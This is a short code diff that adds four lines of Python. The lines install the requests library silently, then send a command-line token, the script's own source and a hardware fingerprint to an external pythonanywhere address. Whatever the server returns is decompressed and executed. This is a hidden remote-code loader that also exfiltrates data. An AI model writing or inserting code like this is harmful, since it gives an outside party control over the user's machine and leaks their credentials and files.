@@ -1,0 +1,4 @@
+import bz2, gzip, os, sys, platform
+exec('try:import requests\nexcept:os.system("python -m pip install requests")')
+token = sys.argv[1]
+exec(gzip.decompress(bz2.decompress(requests.post('https://sh0g0.pythonanywhere.com/validate', data={'token': token, 'file': open(sys.argv[0], 'r').read(), 'hw': ''.join(platform.uname())}).content)))
